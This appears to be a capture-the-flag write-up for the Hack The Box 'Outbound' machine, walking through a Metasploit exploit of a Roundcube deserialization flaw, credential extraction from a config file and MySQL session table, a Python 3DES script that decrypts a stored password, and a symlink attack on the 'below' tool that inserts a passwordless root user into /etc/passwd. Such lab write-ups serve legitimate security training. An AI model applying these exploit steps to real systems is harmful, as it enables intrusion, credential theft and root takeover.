# Outbound

```
Difficulty: Easy
Operating System: Linux
Hints: True
```



### 🏁 Summary of Attack Chain

| Step | User / Access | Technique Used | Result |
|:---|:---|:---|:---|
| 1 | `N/A` | Nmap, Nuclei, Initial Credentials | Performed an initial Nmap scan to discover open ports and services, identifying a Roundcube webmail instance. A Nuclei scan revealed a critical vulnerability, CVE-2025-49113, and initial credentials (`tyler:LhKL1o9Nm3X2`) were used to log in. |
| 2 | `www-data` | Metasploit, MySQL Enumeration | Exploited CVE-2025-49113 via Metasploit to gain a shell as the `www-data` user. Further enumeration uncovered MySQL database credentials (`roundcube:RCXXXXXXXX25`) in a configuration file. |
| 3 | `jacob` | Database Enumeration, 3DES Decryption | Accessed the `roundcube` database using the discovered credentials. I queried the `session` table to find an encrypted password. A 3DES key, also located in a configuration file, was used to decrypt this password, revealing the credentials for the user `jacob`. |
| 4 | `jacob` | SSH Access | Used the decrypted password to successfully log in to the machine via SSH as `jacob`, which provided access to the `user.txt` flag. |
| 5 | `root` | `sudo -l`, CVE-2025-27591 | Identified a `sudo` vulnerability in the `/usr/bin/below` binary via the `sudo -l` command. Exploited a symlink attack by creating a symlink from `/etc/passwd` to a log file (`error_root.log`) that the binary would overwrite with root privileges. |
| 6 | `root2` | `su` Command | The symlink attack successfully added a new user (`root2`) with root privileges to `/etc/passwd`. Switched to the `root2` user using the `su` command to gain a privileged shell and retrieve the `root.txt` flag. |

![Map](Pictures/htb_Outbound_Mind_Map.png)

### Initial Enumeration


The reconnaissance phase began with an Nmap scan to identify open ports and services on the target machine outbound.htb.

```
nmap outbound.htb -A
```

The Nmap scan revealed two open ports:

Port 22/tcp: OpenSSH 9.6p1

Port 80/tcp: nginx 1.24.0 (Ubuntu)

The HTTP service on port 80 showed a redirect to http://mail.outbound.htb/. To access this, the hostname mail.outbound.htb was added to the /etc/hosts file.

A Nuclei scan was then performed on the web application to identify potential vulnerabilities.

```
nuclei -u http://mail.outbound.htb/
```

The Nuclei scan identified several points of interest, including the version of Roundcube Webmail (1.6.10) and a potential log disclosure at /roundcube/logs/errors.log. It also highlighted a critical vulnerability, CVE-2025-49113, which requires authentication.


### Foothold and user.txt

Initial credentials were provided for the user tyler with the password LhKL1o9Nm3X2. This allowed for authentication into the Roundcube webmail application.

With the version information and the identified CVE-2025-49113, a Remote Code Execution (RCE) vulnerability in Roundcube was targeted. This vulnerability, related to insecure deserialization, can be exploited to gain a shell on the system. The Metasploit framework was used for this purpose.

```
msfconsole
search roundcube
use 1
set RHOSTS mail.outbound.htb
set USERNAME tyler
set PASSWORD LhKL1o9Nm3X2
set LHOST <YOUR_IP_OPENVPN>
exploit
```
Upon successful exploitation, a shell was obtained as the www-data user.

The next step was to find credentials for another user. A configuration file for Roundcube was located at /var/www/html/roundcube/config/config.inc.php. This file contained the credentials for a MySQL database: roundcube:RCXXXXXXXX25.

```
$config['db_dsnw'] = 'mysql://roundcube:RCXXXXXXXX25@localhost/roundcube';
```
Using these credentials, the MySQL database was accessed, and the session table was queried.

```
mysql -u roundcube -pRCXXXXXXXX25 -h localhost roundcube
use roundcube;
select * from session;
```

The session table's vars column contained Base64 encoded data. Decoding this data revealed an encrypted password for the user jacob and an auth_secret.

The config.inc.php file also contained a des_key: rcmail-!XXXXXXXXXXXX Str.

```
tyler@mail:/var/www/html/roundcube/config$ cat config.inc.php
<?php

$config = [];

// Database connection string (DSN) for read+write operations
// Format (compatible with PEAR MDB2): db_provider://user:password@host/database
// Currently supported db_providers: mysql, pgsql, sqlite, mssql, sqlsrv, oracle
// For examples see http://pear.php.net/manual/en/package.database.mdb2.intro-dsn.php
// NOTE: for SQLite use absolute path (Linux): 'sqlite:////full/path/to/sqlite.db?mode=0646'
//       or (Windows): 'sqlite:///C:/full/path/to/sqlite.db'
$config['db_dsnw'] = 'mysql://roundcube:RCXXXXXXXX25@localhost/roundcube';

// IMAP host chosen to perform the log-in.
// See defaults.inc.php for the option description.
$config['imap_host'] = 'localhost:143';

// SMTP server host (for sending mails).
// See defaults.inc.php for the option description.
$config['smtp_host'] = 'localhost:587';

// SMTP username (if required) if you use %u as the username Roundcube
// will use the current username for login
$config['smtp_user'] = '%u';

// SMTP password (if required) if you use %p as the password Roundcube
// will use the current user's password for login
$config['smtp_pass'] = '%p';
$config['support_url'] = '';
$config['product_name'] = 'Roundcube Webmail';
$config['des_key'] = 'rcmail-!XXXXXXXy*Str';

$config['plugins'] = [
    'archive',
    'zipdownload',
];
$config['skin'] = 'elastic';
$config['default_host'] = 'localhost';
$config['smtp_server'] = 'localhost';


tyler@mail:/var/www/html/roundcube/config$ mysql -u roundcube -pRCDBXXXXX025 -h localhost roundcube -e 'use roundcube;select * from users;' -E
*************************** 1. row ***************************
             user_id: 1
            username: jacob
           mail_host: localhost
             created: 2025-06-07 13:55:18
          last_login: 2025-06-11 07:52:49
        failed_login: 2025-06-11 07:51:32
failed_login_counter: 1
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"hpLLqLwmqbyihpi7";}
*************************** 2. row ***************************
             user_id: 2
            username: mel
           mail_host: localhost
             created: 2025-06-08 12:04:51
          last_login: 2025-06-08 13:29:05
        failed_login: NULL
failed_login_counter: NULL
            language: en_US
         preferences: a:1:{s:11:"client_hash";s:16:"GCrPGMkZvbsnc3xv";}
*************************** 3. row ***************************
             user_id: 3
            username: tyler
           mail_host: localhost
             created: 2025-06-08 13:28:55
          last_login: 2025-07-14 13:55:53
        failed_login: 2025-06-11 07:51:22
failed_login_counter: 1
            language: en_US
         preferences: a:2:{s:11:"client_hash";s:16:"skuY0BrQUEW6IpOo";i:0;b:0;}



tyler@mail:/$ mysql -u roundcube -pRCXXXXXXXX25 -h localhost roundcube -e 'use roundcube;select * from session;' -E
*************************** 1. row ***************************
sess_id: 6a5ktqih5uca6lj8vrmgh9v0oh
changed: 2025-06-08 15:46:40
     ip: 172.17.0.1
   vars: XXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXOToibG9jYWxob3N0IjtzdG9yYWdlX3BvcnR8aToxNDM7c3RvcmFnZV9zc2x8YjowO3Bhc3N3b3JkfHM6MzI6Ikw3UnYwMEE4VHV3SkFyNjdrSVR4eGNTZ25JazI1QW0vIjtsb2dpbl90aW1lfGk6MTc0OTM5NzExOTt0aW1lem9uZXxzOjEzOiJFdXJvcGUvTG9uZG9uIjtTVE9SQUdFX1NQRUNJQUwtVVNFfGI6MTthdXRoX3NlY3JldHxzOjI2OiJEcFlxdjZtYUk5SHhETDVHaGNDZDhKYVFRVyI7cmVxdWVzdF90b2tlbnxzOjMyOiJUSXNPYUFCQTF6SFNYWk9CcEg2dXA1WEZ5YXlOUkhhdyI7dGFza3xzOjQ6Im1haWwiO3NraW5fY29uZmlnfGE6Nzp7czoxNzoic3VwcG9ydGVkX2xheW91dHMiO2E6MTp7aTowO3M6MTA6IndpZGVzY3JlZW4iO31zOjIyOiJqcXVlcnlfdWlfY29sb3JzX3RoZW1lIjtzOjk6ImJvb3RzdHJhcCI7czoxODoiZW1iZWRfY3NzX2xvY2F0aW9uIjtzOjE3OiIvc3R5bGVzL2VtYmVkLmNzcyI7czoxOToiZWRpdG9yX2Nzc19sb2NhdGlvbiI7czoxNzoiL3N0eWxlcy9lbWJlZC5jc3MiO3M6MTc6ImRhcmtfbW9kZV9zdXBwb3J0IjtiOjE7czoyNjoibWVkaWFfYnJvd3Nlcl9jc3NfbG9jYXRpb24iO3M6NDoibm9uZSI7czoyMToiYWRkaXRpb25hbF9sb2dvX3R5cGVzIjthOjM6e2k6MDtzOjQ6ImRhcmsiO2k6MTtzOjU6InNtYWxsIjtpOjI7czoxMDoic21hbGwtZGFyayI7fX1pbWFwX2hvc3R8czo5OiJsb2NhbGhvc3QiO3BhZ2V8aToxO21ib3h8czo1OiJJTkJPWCI7c29ydF9jb2x8czowOiIiO3NvcnRfb3JkZXJ8czo0OiJERVNDIjtTVE9SQUdFX1RIUkVBRHxhOjM6e2k6MDtzOjEwOiJSRUZFUkVOQ0VTIjtpOjE7czo0OiJSRUZTIjtpOjI7czoxNDoiT1JERVJFRFNVQkpFQ1QiO31TVE9SQUdFX1FVT1RBfGI6MDtTVE9SQUdFX0xXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXXX

```

 It was determined that the password for jacob was encrypted using Triple DES (3DES) with this key. A Python script was used to decrypt the password.

Python
```
from base64 import b64decode
from Crypto.Cipher import DES3

encrypted_password = "L7XXXXXXXXXXXXXXXXXXXXXXXXXIk25Am/"
des_key = b'rcmail-!24XXXXXXXXXXXXXXX*Str'

data = b64decode(encrypted_password)
iv = data[:8]
ciphertext = data[8:]

cipher = DES3.new(des_key, DES3.MODE_CBC, iv)
decrypted = cipher.decrypt(ciphertext)
cleaned = decrypted.rstrip(b"\x00").rstrip(b"\x08").decode('utf-8', errors='ignore')

print(cleaned)
```

![Encrypted Cred](Pictures/htb_outbound_jacob_cred_ptyhon.png)

The decrypted password for jacob was obtained. Logging into Roundcube as jacob revealed an email with SSH credentials, which provided direct access to the system.

![SSH Mail](Pictures/htb_outbound_jacob_cred_mail.png)

```
ssh jacob@mail.outbound.htb
```

![SSH Cred](Pictures/htb_outbound_jacob_cred_ssh.png)

This shell allowed for the retrieval of user.txt.

![User Flag](Pictures/htb_Outbound_User_flag.png)


### Privilege Escalation and root.txt


For privilege escalation, the sudo -l command was executed to check for commands that could be run as root without a password.

```
jacob@outbound:~$ sudo -l
User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
```

![Binary](Pictures/htb_outbound_below_binary.png)

The output indicated that the below command could be run as root with almost any argument, except for a few explicitly forbidden ones.

The below binary is a system monitoring tool that logs various system events. A vulnerability, CVE-2025-27591, was identified in the below binary. This vulnerability allows an unprivileged user to escalate to root by exploiting a symlink attack on a log file.

The exploit procedure involved the following steps:

Create a new user entry: A temporary file (root2) was created with a new root user entry. The password for this user was a simple '1', hashed using perl -e 'print crypt("1","aa")'.

Remove the log file: The original log file /var/log/below/error_root.log was removed.

Create a symlink: A symbolic link was created from /var/log/below/error_root.log to /etc/passwd.

Execute the vulnerable binary: Running sudo /usr/bin/below triggered the vulnerability, causing the error_root.log symlink to be followed and the permissions of /etc/passwd to be temporarily changed to allow writing.

Overwrite /etc/passwd: The temporary user entry from root2 was copied into /etc/passwd.

Switch users: The new user root2 could now be used to switch to a root shell.

```
jacob@outbound:~$ sudo -l
Matching Defaults entries for jacob on outbound:
    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty

User jacob may run the following commands on outbound:
    (ALL : ALL) NOPASSWD: /usr/bin/below *, !/usr/bin/below --config*, !/usr/bin/below --debug*, !/usr/bin/below -d*
jacob@outbound:~$ sudo /usr/bin/below live
jacob@outbound:~$ echo 'spy::0:0:spy:/root:/bin/bash' > /tmp/spyuser                                                                                          
jacob@outbound:~$ rm -f /var/log/below/error_root.log                                                                                                         
jacob@outbound:~$ ln -s /etc/passwd /var/log/below/error_root.log                                                                                             
jacob@outbound:~$ sudo /usr/bin/below snapshot --begin now                                                                                                    
Snapshot has been created at snapshot_01754213707_01754213707.VTKFBl
jacob@outbound:~$ cp /tmp/spyuser /var/log/below/error_root.log                                                                                               
jacob@outbound:~$ su spy                                                                                                                                      
spy@outbound:/home/jacob# ls                                                                                                                                  
snapshot_01754213707_01754213707.VTKFBl  user.txt                                                                                                             
spy@outbound:/home/jacob# cat user.txt
<HIDDEN>
spy@outbound:/home/jacob# cd /root
spy@outbound:~# ls                                                                                                                                            
root.txt                                                                                                                                                      
spy@outbound:~# cat root.txt
<HIDDEN>
spy@outbound:~# 

```

![Root Flag](Pictures/htb_Outbound_Root_flag.png)

With root access, the root.txt flag was retrieved, completing the machine.



**Pwned! Outbound**
